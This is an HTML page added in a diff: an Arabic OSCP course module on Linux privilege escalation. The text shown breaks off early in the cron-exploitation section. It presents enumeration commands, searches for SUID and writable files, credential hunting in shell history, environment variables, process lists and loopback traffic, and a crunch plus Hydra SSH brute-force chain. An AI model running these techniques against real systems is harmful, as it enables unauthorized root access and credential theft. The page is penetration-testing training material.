@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 15: رفع الامتيازات على Linux</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{--bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;--border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;}
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background .2s,color .2s;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width .08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,.5);transition:transform .15s,border-color .15s,opacity .2s;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}
+  #toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,.03);transition:background .15s;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  /* SVG helpers */
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-line-r{stroke:var(--red);stroke-width:1.5;fill:none;}
+  .dsvg-line-g{stroke:var(--green);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-r{fill:var(--red);}
+  .dsvg-arr-g{fill:var(--green);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@oscp:~/module-15$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">OSCP · PEN-200 · Module 15</span>
+    <h1>رفع الامتيازات على Linux (Privilege Escalation)</h1>
+    <p class="lede">من Shell محدود لـ root — عبر التعداد الدقيق لنموذج الصلاحيات، صيد بيانات الاعتماد من آثار المستخدمين، استغلال Cron Jobs وملفات النظام، وتقنيات SUID وCapabilities وSudo وKernel Exploits.</p>
+    <div class="tags">
+      <span class="tag">linpeas</span>
+      <span class="tag">suid</span>
+      <span class="tag">capabilities</span>
+      <span class="tag">sudo-abuse</span>
+      <span class="tag">cron-hijack</span>
+      <span class="tag">passwd-abuse</span>
+      <span class="tag">kernel-exploit</span>
+      <span class="tag">gtfobins</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#intro"><span class="toc-num">00</span><span>المبدأ الأساسي: كل شيء ملف — نموذج الصلاحيات</span></a>
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>تعداد البيئة — يدوي وآلي</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>آثار المستخدمين وبصمات الخدمات</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>الصلاحيات غير الآمنة — Cron و/etc/passwd</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>SUID وLinux Capabilities وSudo</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>Kernel Vulnerabilities</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ INTRO -->
+<h1 id="intro">Module 15: رفع الامتيازات على Linux</h1>
+<p>الفلسفة الأساسية في Unix/Linux: <strong>"كل شيء ملف"</strong> — معظم موارد النظام (ملفات، مجلدات، devices، processes، network interfaces) بتتعامَل كملفات. هذا التصميم بيجعل نموذج الصلاحيات نقطة تحليل مركزية لأي مسار لرفع الامتيازات.</p>
+
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>تعداد بيئة Linux وتحديد نقاط الضعف في نموذج الصلاحيات</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>استغلال إعدادات Cron وملفات النظام القابلة للكتابة للوصول لـ root</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>تقنيات SUID وCapabilities وSudo والـ Kernel لترقية الامتيازات</span></div>
+</div>
+
+<h3>نموذج صلاحيات Linux</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 175" xmlns="http://www.w3.org/2000/svg">
+  <!-- Title -->
+  <text x="350" y="18" text-anchor="middle" class="dsvg-muted" font-size="11">مثال: -rw-r----- 1 root shadow /etc/shadow</text>
+  <!-- Boxes for each char group -->
+  <!-- File type -->
+  <rect x="30" y="28" width="52" height="50" rx="6" class="dsvg-box"/>
+  <text x="56" y="50" text-anchor="middle" class="dsvg-muted" font-size="18" font-weight="700" font-family="IBM Plex Mono">-</text>
+  <text x="56" y="70" text-anchor="middle" class="dsvg-muted" font-size="9">نوع الملف</text>
+  <!-- Owner -->
+  <rect x="95" y="28" width="130" height="50" rx="6" class="dsvg-box-a"/>
+  <text x="160" y="50" text-anchor="middle" class="dsvg-amber" font-size="20" font-weight="700" font-family="IBM Plex Mono">rw-</text>
+  <text x="160" y="70" text-anchor="middle" class="dsvg-amber" font-size="9">Owner (root)</text>
+  <!-- Group -->
+  <rect x="238" y="28" width="130" height="50" rx="6" class="dsvg-box-b"/>
+  <text x="303" y="50" text-anchor="middle" class="dsvg-blue" font-size="20" font-weight="700" font-family="IBM Plex Mono">r--</text>
+  <text x="303" y="70" text-anchor="middle" class="dsvg-blue" font-size="9">Group (shadow)</text>
+  <!-- Others -->
+  <rect x="381" y="28" width="130" height="50" rx="6" class="dsvg-box-g"/>
+  <text x="446" y="50" text-anchor="middle" class="dsvg-green" font-size="20" font-weight="700" font-family="IBM Plex Mono">---</text>
+  <text x="446" y="70" text-anchor="middle" class="dsvg-green" font-size="9">Others</text>
+  <!-- Meaning row -->
+  <text x="56"  y="100" text-anchor="middle" class="dsvg-muted" font-size="9">- = ملف عادي</text>
+  <text x="160" y="100" text-anchor="middle" class="dsvg-amber" font-size="9">r=قراءة w=كتابة -=لا execute</text>
+  <text x="303" y="100" text-anchor="middle" class="dsvg-blue"  font-size="9">r=قراءة فقط</text>
+  <text x="446" y="100" text-anchor="middle" class="dsvg-green" font-size="9">لا صلاحيات</text>
+  <!-- Permissions table -->
+  <rect x="30" y="116" width="620" height="50" rx="6" class="dsvg-box"/>
+  <text x="120" y="138" text-anchor="middle" class="dsvg-amber" font-size="10" font-weight="700">r (Read)</text>
+  <text x="120" y="154" text-anchor="middle" class="dsvg-muted" font-size="9">قراءة الملف / عَرض محتويات المجلد</text>
+  <text x="350" y="138" text-anchor="middle" class="dsvg-red"   font-size="10" font-weight="700">w (Write)</text>
+  <text x="350" y="154" text-anchor="middle" class="dsvg-muted" font-size="9">تعديل الملف / إنشاء أو حذف داخل المجلد</text>
+  <text x="585" y="138" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">x (Execute)</text>
+  <text x="585" y="154" text-anchor="middle" class="dsvg-muted" font-size="9">تشغيل برنامج / الدخول (cd) لمجلد</text>
+</svg>
+<div class="diagram-caption">أي Misconfiguration في هذه الصلاحيات = مسار محتمل لرفع الامتيازات</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">تعداد البيئة — يدوي وآلي</span></h2>
+
+<h3>التعداد اليدوي — المستخدم والنظام</h3>
+<div class="callout warning">
+<div class="callout-label">⚠ ابدأ هنا دايماً</div>
+<p>بعد الحصول على Shell، أول سؤال: "مين أنا وإيه اللي أقدر أعمله؟" <code>uid=0</code> = root مباشرة. <code>uid=1000+</code> = مستخدم عادي يحتاج ترقية.</p>
+</div>
+
+<div class="table-wrap"><table>
+<thead><tr><th>الأمر</th><th>ما يكشفه</th><th>ما تبحث عنه</th></tr></thead>
+<tbody>
+<tr><td><code>id</code></td><td>UID، GID، والمجموعات</td><td>مجموعات ذات امتيازات: sudo, docker, disk, adm</td></tr>
+<tr><td><code>cat /etc/passwd</code></td><td>كل حسابات المستخدمين</td><td>حسابات بـ UID=0 غير root، حسابات الخدمات</td></tr>
+<tr><td><code>hostname</code></td><td>اسم الجهاز</td><td>يكشف الدور: web01, db02, dc01</td></tr>
+<tr><td><code>cat /etc/issue</code></td><td>توزيعة Linux وإصدارها</td><td>يحدّد Kernel Exploits المناسبة</td></tr>
+<tr><td><code>uname -a</code></td><td>إصدار الـ Kernel والمعمارية</td><td>رقم الـ Kernel للبحث عن CVEs</td></tr>
+<tr><td><code>ip a</code></td><td>الـ Network Interfaces</td><td>واجهات متعددة = pivot point محتمل</td></tr>
+<tr><td><code>ss -tulpn</code></td><td>المنافذ المفتوحة + المستمعة</td><td>خدمات داخلية غير مكشوفة = سطح هجوم جديد</td></tr>
+<tr><td><code>ps aux</code></td><td>كل العمليات الجارية</td><td>خدمات بتشتغل كـ root (web servers, DBs, backups)</td></tr>
+<tr><td><code>dpkg -l</code> / <code>rpm -qa</code></td><td>التطبيقات المثبَّتة وإصداراتها</td><td>نقطة بداية بحث Exploits</td></tr>
+</tbody>
+</table></div>
+
+<h3>تعداد Cron Jobs — هدف أساسي</h3>
+<p>Cron Jobs بتشتغل تلقائياً — غالبًا بصلاحيات root. لو script مُشغَّل بـ cron كـ root وقابل للكتابة من مستخدم عادي → ترقية فورية.</p>
+<div class="code-wrap"><span class="code-tag">bash — cron enumeration</span><pre><code># الـ Crontab الرئيسي للنظام
+cat /etc/crontab
+
+# مجلدات cron الدورية
+ls -la /etc/cron.daily/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.weekly/
+ls -la /etc/cron.monthly/
+ls -la /etc/cron.d/
+
+# Cron jobs المستخدم الحالي
+crontab -l
+
+# البحث عن scripts قابلة للكتابة في المسارات المذكورة بالـ Crontab
+cat /etc/crontab | grep -v '^#'
+# → * * * * * root /home/joe/backup.sh
+ls -la /home/joe/backup.sh
+# → -rwxrwxrw- ← world-writable! اشتغل عليه
+</code></pre></div>
+
+<h3>البحث عن ملفات ذات صلاحيات غير آمنة</h3>
+<div class="code-wrap"><span class="code-tag">bash — permission hunting</span><pre><code># إيجاد الملفات القابلة للكتابة من أي مستخدم
+find / -writable -type f 2>/dev/null | grep -v proc
+
+# إيجاد المجلدات القابلة للكتابة
+find / -writable -type d 2>/dev/null
+
+# إيجاد SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+
+# إيجاد SGID binaries
+find / -perm -g=s -type f 2>/dev/null
+
+# إيجاد ملفات بصلاحيات 777
+find / -perm 777 -type f 2>/dev/null
+</code></pre></div>
+
+<h3>الأدوات الآلية</h3>
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">LinPEAS</span>
+  <div class="mtitle">الأحدث والأشمل</div>
+  <div class="mdesc">Colored output — أحمر = نتيجة حرجة. الأكثر تحديثاً والأوسع تغطيةً. يتحمَّل من github.com/carlospolop/PEASS-ng</div>
+</div>
+<div class="method-card">
+  <span class="mnum">LinEnum</span>
+  <div class="mdesc">تعداد شامل — يفحص مئات مسارات الترقية الشائعة. أقل تحديثاً من LinPEAS لكن مجرَّب.</div>
+  <div class="mtitle">شامل وموثوق</div>
+</div>
+<div class="method-card">
+  <span class="mnum">unix-privesc</span>
+  <div class="mtitle">unix-privesc-check</div>
+  <div class="mdesc">Script Bash — وضعان: standard (سريع، أقل false positives) وdetailed (أعمق، أبطأ). بدون ملفات إضافية تقريباً.</div>
+</div>
+</div>
+
+<div class="callout warning">
+<div class="callout-label">⚠ الأتمتة ≠ الاكتمال</div>
+<p>الأدوات الآلية كثيراً ما تفوَّت إعدادات مخصَّصة وثغرات فريدة. دايماً ادمج الأتمتة مع التحليل اليدوي — الأداة مُسرِّعة مش بديلة.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">آثار المستخدمين وبصمات الخدمات</span></h2>
+
+<h3>الملفات المخفية وتاريخ الأوامر</h3>
+<p>Linux بيخزَّن ملفات الإعداد والتاريخ في ملفات مخفية (بتبدأ بنقطة). هذه الملفات غالبًا مصدر خصيب لبيانات الاعتماد — جهد قليل وعائد مرتفع.</p>
+
+<div class="table-wrap"><table>
+<thead><tr><th>الملف</th><th>محتواه</th><th>ما تبحث عنه</th></tr></thead>
+<tbody>
+<tr><td><code>~/.bash_history</code></td><td>كل الأوامر المُنفَّذة سابقاً</td><td>كلمات مرور مُلصَقة مباشرة: <code>mysql -u root -pSuperSecret!</code></td></tr>
+<tr><td><code>~/.bashrc</code></td><td>يُنفَّذ مع كل Shell جديد</td><td>متغيّرات بيئة بقيم حساسة للـ Automation Scripts</td></tr>
+<tr><td><code>~/.bash_profile</code></td><td>يُنفَّذ عند تسجيل الدخول</td><td>نفس ما فوق + PATH مخصَّص</td></tr>
+<tr><td><code>~/.profile</code></td><td>ملف إعداد Login</td><td>Credentials للخدمات والـ APIs</td></tr>
+<tr><td><code>~/.ssh/</code></td><td>مفاتيح SSH</td><td><code>authorized_keys</code> و<code>id_rsa</code> (مفاتيح خاصة غير محمية)</td></tr>
+</tbody>
+</table></div>
+
+<div class="code-wrap"><span class="code-tag">bash — user trails</span><pre><code># تاريخ الأوامر — غالبًا يحتوي passwords plain text
+cat ~/.bash_history
+# → mysql -u root -pSuperSecret123
+# → curl -u admin:P@ssw0rd! http://internal-api/...
+
+# متغيّرات البيئة المُصدَرة
+cat ~/.bashrc
+# → export SCRIPT_CREDENTIALS=lab
+
+# كل متغيّرات البيئة الحالية
+env
+printenv
+# → SCRIPT_CREDENTIALS=lab
+# → DB_PASSWORD=secret123
+
+# إيجاد ملفات hidden في home directory
+ls -la ~
+ls -la /home/*/
+</code></pre></div>
+
+<h3>سلسلة هجوم متغيّرات البيئة</h3>
+<div class="callout case">
+<div class="callout-label">⚙ سيناريو — Env Variable Credential Reuse</div>
+<p>
+① إيجاد <code>SCRIPT_CREDENTIALS=lab</code> في الـ env<br/>
+② التحقق إنه مُصدَّر في <code>~/.bashrc</code> (دائم)<br/>
+③ تجربة الكلمة مباشرة على root: <code>su - root</code><br/>
+④ لو فشل → بناء wordlist مخصَّص (Lab000–Lab999) → Hydra على SSH<br/>
+⑤ credential واحدة ممكن تخترق حسابات متعددة
+</p>
+</div>
+<div class="code-wrap"><span class="code-tag">bash — env attack chain</span><pre><code># تجربة الـ Credential على root مباشرة
+su - root
+# Password: lab  → لو نجح = root فوري!
+
+# لو فشل → بناء wordlist وBrute-Force
+crunch 6 6 -t Lab%%% > lab.txt
+# → Lab000, Lab001, ..., Lab999
+
+# Brute-Force SSH مع القائمة المولَّدة
+hydra -l eve -P lab.txt ssh://192.168.50.X
+# → [22][ssh] login: eve  pass: Lab123
+</code></pre></div>
+
+<h3>مراقبة العمليات لاصطياد بيانات الاعتماد</h3>
+<p>المستخدمون ذوو الامتيازات المنخفضة يقدرون بشكل افتراضي يشوفوا Command-Line Arguments لكل العمليات — حتى عمليات root. بعض الخدمات بتمرَّر كلمات المرور مباشرة في Command Line.</p>
+<div class="code-wrap"><span class="code-tag">bash — process monitoring</span><pre><code># Watch Loop — مراقبة مستمرة لاصطياد credentials
+while true; do
+  ps aux | grep -i 'pass'
+  sleep 1
+done
+
+# مثال على ما ممكن تصطاده:
+# root 1423 sshpass -p 'W3lcome1!' ssh backup@192.168.1.5
+
+# tcpdump — اصطياد ترافيك الـ Loopback
+# (لو tcpdump ممنوح للمستخدم العادي)
+tcpdump -i lo -A | grep -i pass
+# → Password: r00tpassword!
+# → Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+</code></pre></div>
+
+<div class="callout tip">
+<div class="callout-label">✓ اصطياد HTTP Basic Auth</div>
+<p>لو شفت <code>Authorization: Basic</code> في الترافيك، القيمة دي Base64 encoded. فكَّها بـ <code>echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d</code> → <code>admin:password</code></p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">الصلاحيات غير الآمنة — Cron و/etc/passwd</span></h2>
+
+<h3>Writable Cron Script — الاستغلال</h3>
+<p>Cron Jobs التي يديرها root بتشتغل بصلاحيات root كاملة. لو Script المُشغَّلة بـ Cron موجودة في مكان قابل للكتابة من مستخدم عادي → حقن أوامر → تنفَّذ كـ root.</p>
+
+<div class="diagram-card">
